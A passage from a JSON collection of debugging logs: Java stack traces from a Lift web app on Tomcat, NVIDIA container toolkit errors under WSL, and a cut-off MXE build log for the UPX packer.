\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$withReq$2.apply(S.scala:1772)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.withReq(S.scala:1771)\r\n\tnet.liftweb.http.S$.withReq(S.scala:47)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44$$anonfun$apply$45$$anonfun$apply$46.apply(S.scala:1757)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44$$anonfun$apply$45.apply(S.scala:1755)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44.apply(S.scala:1754)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1.apply(S.scala:1753)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$_innerInit(S.scala:1752)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53$$anonfun$apply$54$$anonfun$apply$55$$anonfun$apply$56.apply(S.scala:1795)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53$$anonfun$apply$54$$anonfun$apply$55.apply(S.scala:1793)\r\n\tnet.liftweb.http.CoreRequestVarHandler$class.apply(Vars.scala:605)\r\n\tnet.liftweb.http.RequestVarHandler$.apply(Vars.scala:507)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53$$anonfun$apply$54.apply(S.scala:1792)\r\n\tnet.liftweb.http.CoreRequestVarHandler$class.apply(Vars.scala:605)\r\n\tnet.liftweb.http.TransientRequestVarHandler$.apply(Vars.scala:520)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53.apply(S.scala:1791)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52.apply(S.scala:1790)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2.apply(S.scala:1789)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$_init(S.scala:1788)\r\n\tnet.liftweb.http.S$class.init(S.scala:1376)\r\n\tnet.liftweb.http.S$.init(S.scala:47)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$.doSession$1(LiftServlet.scala:384)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$.process(LiftServlet.scala:394)\r\n\tnet.liftweb.http.LiftServlet.stepThroughPipeline$1(LiftServlet.scala:428)\r\n\tnet.liftweb.http.LiftServlet.doService(LiftServlet.scala:436)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$doIt$1$2.apply(LiftServlet.scala:157)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$doIt$1$2.apply(LiftServlet.scala:156)\r\n\tnet.liftweb.util.TimeHelpers$class.calcTime(TimeHelpers.scala:427)\r\n\tnet.liftweb.util.Helpers$.calcTime(Helpers.scala:34)\r\n\tnet.liftweb.util.TimeHelpers$class.logTime(TimeHelpers.scala:446)\r\n[Truncated]\n\tnet.liftweb.http.provider.servlet.ServletFilterProvider$class.doFilter(ServletFilterProvider.scala:74)\r\n\tnet.liftweb.http.LiftFilter.doFilter(LiftServlet.scala:1064)\r\n\torg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\r\n\torg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\r\n\torg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:219)\r\n\torg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:110)\r\n\torg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:494)\r\n\torg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\r\n\torg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:104)\r\n\torg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:1025)\r\n\torg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\r\n\torg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:445)\r\n\torg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1137)\r\n\torg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:637)\r\n\torg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:318)\r\n\tjava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n\tjava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n\torg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\r\n\tjava.lang.Thread.run(Thread.java:748)\r\n"
    },
    {
        "logs": "```\r\nException occured while processing /export/timesheet/-31\r\nMessage: java.lang.NullPointerException\r\n\tjava.io.ByteArrayInputStream.<init>(ByteArrayInputStream.java:106)\r\n\tcode.export.ExcelExport$.exportTimesheet(ExcelExport.scala:94)\r\n\tbootstrap.liftweb.Boot$$anonfun$boot$3$$anonfun$applyOrElse$1.apply(Boot.scala:197)\r\n\tbootstrap.liftweb.Boot$$anonfun$boot$3$$anonfun$applyOrElse$1.apply(Boot.scala:191)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$liftedTree1$1$1.apply(LiftServlet.scala:485)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$liftedTree1$1$1.apply(LiftServlet.scala:485)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.functionLifespan(S.scala:1833)\r\n\tnet.liftweb.http.S$.functionLifespan(S.scala:47)\r\n\tnet.liftweb.http.LiftServlet.liftedTree1$1(LiftServlet.scala:484)\r\n\tnet.liftweb.http.LiftServlet.net$liftweb$http$LiftServlet$$dispatchStatefulRequest(LiftServlet.scala:472)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$$anonfun$doSession$1$1.apply(LiftServlet.scala:385)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$$anonfun$doSession$1$1.apply(LiftServlet.scala:385)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$wrapQuery(S.scala:1562)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_nest2InnerInit$1$$anonfun$apply$40.apply(S.scala:1718)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$doAround(S.scala:1491)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$doAround$1.apply(S.scala:1492)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15.net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1(DB.scala:235)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15$$anonfun$net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1$1.apply(DB.scala:251)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15$$anonfun$net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1$1.apply(DB.scala:251)\r\n\tnet.liftweb.db.DB$$anonfun$use$1.apply(DB.scala:684)\r\n\tnet.liftweb.util.DynoVar$class.run(ThreadGlobal.scala:95)\r\n\tnet.liftweb.db.DB$currentConn$.run(DB.scala:669)\r\n\tnet.liftweb.db.DB$class.use(DB.scala:681)\r\n\tnet.liftweb.db.DB$$anon$1.use(DB.scala:40)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15.net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1(DB.scala:251)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15.apply(DB.scala:253)\r\n\tnet.liftweb.util.DynoVar$class.run(ThreadGlobal.scala:95)\r\n\tnet.liftweb.db.DB$$anon$2$DepthCnt$.run(DB.scala:224)\r\n\tnet.liftweb.db.DB$$anon$2.apply(DB.scala:227)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$doAround(S.scala:1492)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_nest2InnerInit$1.apply(S.scala:1716)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$_nest2InnerInit(S.scala:1715)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44$$anonfun$apply$45$$anonfun$apply$46$$anonfun$apply$47.apply(S.scala:1762)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$withReq$2.apply(S.scala:1772)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.withReq(S.scala:1771)\r\n\tnet.liftweb.http.S$.withReq(S.scala:47)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44$$anonfun$apply$45$$anonfun$apply$46.apply(S.scala:1757)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44$$anonfun$apply$45.apply(S.scala:1755)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44.apply(S.scala:1754)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1.apply(S.scala:1753)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$_innerInit(S.scala:1752)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53$$anonfun$apply$54$$anonfun$apply$55$$anonfun$apply$56.apply(S.scala:1795)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53$$anonfun$apply$54$$anonfun$apply$55.apply(S.scala:1793)\r\n\tnet.liftweb.http.CoreRequestVarHandler$class.apply(Vars.scala:605)\r\n\tnet.liftweb.http.RequestVarHandler$.apply(Vars.scala:507)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53$$anonfun$apply$54.apply(S.scala:1792)\r\n\tnet.liftweb.http.CoreRequestVarHandler$class.apply(Vars.scala:605)\r\n\tnet.liftweb.http.TransientRequestVarHandler$.apply(Vars.scala:520)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52$$anonfun$apply$53.apply(S.scala:1791)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2$$anonfun$apply$52.apply(S.scala:1790)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_init$2.apply(S.scala:1789)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$_init(S.scala:1788)\r\n\tnet.liftweb.http.S$class.init(S.scala:1376)\r\n\tnet.liftweb.http.S$.init(S.scala:47)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$.doSession$1(LiftServlet.scala:384)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$.process(LiftServlet.scala:394)\r\n\tnet.liftweb.http.LiftServlet.stepThroughPipeline$1(LiftServlet.scala:428)\r\n\tnet.liftweb.http.LiftServlet.doService(LiftServlet.scala:436)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$doIt$1$2.apply(LiftServlet.scala:157)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$doIt$1$2.apply(LiftServlet.scala:156)\r\n\tnet.liftweb.util.TimeHelpers$class.calcTime(TimeHelpers.scala:427)\r\n\tnet.liftweb.util.Helpers$.calcTime(Helpers.scala:34)\r\n\tnet.liftweb.util.TimeHelpers$class.logTime(TimeHelpers.scala:446)\r\n[Truncated]\n\tnet.liftweb.http.provider.servlet.ServletFilterProvider$class.doFilter(ServletFilterProvider.scala:74)\r\n\tnet.liftweb.http.LiftFilter.doFilter(LiftServlet.scala:1064)\r\n\torg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)\r\n\torg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)\r\n\torg.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:219)\r\n\torg.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:110)\r\n\torg.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:494)\r\n\torg.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)\r\n\torg.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:104)\r\n\torg.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:1025)\r\n\torg.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)\r\n\torg.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:445)\r\n\torg.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1137)\r\n\torg.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:637)\r\n\torg.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:318)\r\n\tjava.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n\tjava.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n\torg.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\r\n\tjava.lang.Thread.run(Thread.java:748)\r\n"
    },
    {
        "logs": "`\r\n0912:00:00.0 3D controller: Microsoft Corporation Device 008e\r\n        Physical Slot: 205491325\r\n        Flags: bus master, fast devsel, latency 0\r\n        Capabilities: <access denied>\r\nlspci: Unable to load libkmod resources: error -12\r\n"
    },
    {
        "logs": "`I0601 16:20:35.910910 10496 nvc.c:372] initializing library context (version=1.4.0, build=704a698b7a0ceec07a48e56c37365c741718c2df)\r\nI0601 16:20:35.910937 10496 nvc.c:346] using root /\r\nI0601 16:20:35.910940 10496 nvc.c:347] using ldcache /etc/ld.so.cache\r\nI0601 16:20:35.910943 10496 nvc.c:348] using unprivileged user 1000:1000\r\nI0601 16:20:35.910952 10496 nvc.c:389] attempting to load dxcore to see if we are running under Windows Subsystem for Linux (WSL)\r\nI0601 16:20:35.926374 10496 dxcore.c:226] Creating a new WDDM Adapter for hAdapter:40000000 luid:25bed4\r\nI0601 16:20:35.936709 10496 dxcore.c:267] Adding new adapter via dxcore hAdapter:40000000 luid:25bed4 wddm version:3000\r\nI0601 16:20:35.936741 10496 dxcore.c:325] dxcore layer initialized successfully\r\nW0601 16:20:35.937182 10496 nvc.c:397] skipping kernel modules load on WSL\r\nI0601 16:20:35.937357 10497 driver.c:101] starting driver service\r\nE0601 16:20:35.945577 10497 driver.c:168] could not start driver service: load library failed: /usr/lib/wsl/drivers/nv_dispi.inf_amd64_43efafcd74b2efc9/libnvidia-ml.so.1: undefined symbol: devicesetgpcclkvfoffset\r\nI0601 16:20:35.945724 10496 driver.c:203] driver service terminated successfully\r\nnvidia-container-cli: initialization error: driver error: failed to process request\r\n"
    },
    {
        "logs": "`\r\nversion: 1.4.0\r\nbuild date: 2021-04-24T14:25+00:00\r\nbuild revision: 704a698b7a0ceec07a48e56c37365c741718c2df\r\nbuild compiler: x86_64-linux-gnu-gcc-7 7.5.0\r\nbuild platform: x86_64\r\nbuild flags: -D_GNU_SOURCE -D_FORTIFY_SOURCE=2 -DNDEBUG -std=gnu11 -O2 -g -fdata-sections -ffunction-sections -fstack-protector -fno-strict-aliasing -fvisibility=hidden -Wall -Wextra -Wcast-align -Wpointer-arith -Wmissing-prototypes -Wnonnull -Wwrite-strings -Wlogical-op -Wformat=2 -Wmissing-format-attribute -Winit-self -Wshadow -Wstrict-prototypes -Wunreachable-code -Wconversion -Wsign-conversion -Wno-unknown-warning-option -Wno-format-extra-args -Wno-gnu-alignof-expression -Wl,-zrelro -Wl,-znow -Wl,-zdefs -Wl,--gc-sections\r\n"
    },
    {
        "logs": "`console\r\nusername_0@tornado:~/src/ext/mxe$ MXE_VERBOSE=1 make upx\r\n[using autodetected 6 job(s)]\r\n[build]     upx                    x86_64-unknown-linux-gnu                                               \r\n\r\nFailed to build package upx for target x86_64-unknown-linux-gnu!\r\n------------------------------------------------------------\r\nmake[1]: Entering directory '/home/username_0/src/ext/mxe'\r\nuname -a\r\nLinux tornado 4.5.4-1-ARCH #1 SMP PREEMPT Wed May 11 22:21:28 CEST 2016 x86_64 GNU/Linux\r\ngit log --pretty=tformat:\"%H - %s [%ar] [%d]\" -1\r\n28dd97f3902fcb664c28255a2773839a4a897a2a - gcc6: fix compiling ucl [22 minutes ago] [ (HEAD -> ucl-fix, origin/ucl-fix)]\r\nlsb_release -a 2>/dev/null || sw_vers 2>/dev/null || true\r\nautoconf --version 2>/dev/null | head -1\r\nautoconf (GNU Autoconf) 2.69\r\nautomake --version 2>/dev/null | head -1\r\nautomake (GNU automake) 1.15\r\ngcc --version\r\ngcc (GCC) 6.1.1 20160501\r\nCopyright (C) 2016 Free Software Foundation, Inc.\r\nThis is free software; see the source for copying conditions.  There is NO\r\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\r\ng++ --version\r\ng++ (GCC) 6.1.1 20160501\r\nCopyright (C) 2016 Free Software Foundation, Inc.\r\nThis is free software; see the source for copying conditions.  There is NO\r\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\r\npython --version\r\nPython 3.5.1\r\nperl --version 2>&1 | head -3\r\nThis is perl 5, version 22, subversion 2 (v5.22.2) built for x86_64-linux-thread-multi\r\nrm -rf   '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu'\r\nmkdir -p '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu' &&    tar xjf '/home/username_0/src/ext/mxe/pkg/upx-3.91-src.tar.bz2'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src'\r\n(cd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src' && patch -p1 -u) < /home/username_0/src/ext/mxe/src/upx-1-fix-logging.patch\r\npatching file src/c_init.cpp\r\npatching file src/console.h\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src' &&  tar xzf '/home/username_0/src/ext/mxe/pkg/ucl-1.03.tar.gz'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03'\r\n(cd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03' && patch -p1 -u) < /home/username_0/src/ext/mxe/src/ucl-1-fixes.patch\r\npatching file acc/acclib/uclock.ch\r\npatching file configure\r\nmkdir '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma' &&    tar xjf '/home/username_0/src/ext/mxe/pkg/lzma920.tar.bz2'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/.'\r\n(cd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/.' && patch -p1 -u) < /home/username_0/src/ext/mxe/src/lzma-1-include-stdio.h.patch \r\npatching file CPP/7zip/Common/FileStreams.cpp\r\n(cd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/.' && patch -p1 -u) < /home/username_0/src/ext/mxe/src/lzma-2-mystring-include-windows.patch\r\npatching file CPP/Common/MyString.h\r\nUPX_UCLDIR='/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03' UPX_LZMADIR='/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma' UPX_LZMA_VERSION=0x920 make -C '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src' -j '6' all 'CXX=g++' 'CC=gcc' 'PKG_CONFIG=/home/username_0/src/ext/mxe/usr/x86_64-unknown-linux-gnu/bin/pkgconf' 'LIBS=-L/home/username_0/src/ext/mxe/usr/x86_64-unknown-linux-gnu/lib -lucl -lz' 'exeext=.exe'\r\nmake[2]: Entering directory '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src'\r\nmake -C src all\r\nmake[3]: Entering directory '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/src'\r\nUpdating .depend\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o c_file.o -c c_file.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o c_init.o -c c_init.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o c_none.o -c c_none.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o c_screen.o -c c_screen.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o compress.o -c compress.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -Wno-cast-qual -Wno-shadow -Wno-error -o compress_lzma.o -c compress_lzma.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o compress_ucl.o -c compress_ucl.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o compress_zlib.o -c compress_zlib.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o except.o -c except.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o file.o -c file.cpp\r\nIn file included from compress_lzma.cpp:236:0:\r\n/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/C/LzmaEnc.c: In function \u2018SRes LzmaEnc_Alloc(CLzmaEnc*, UInt32, ISzAlloc*, ISzAlloc*)\u2019:\r\n/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/C/LzmaEnc.c:1900:8: warning: variable \u2018btMode\u2019 set but not used [-Wunused-but-set-variable]\r\n   Bool btMode;\r\n        ^~~~~~\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o filter.o -c filter.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o filteri.o -c filteri.cpp\r\n[Truncated]\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_tos.o -c p_tos.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_unix.o -c p_unix.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_vmlinx.o -c p_vmlinx.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o 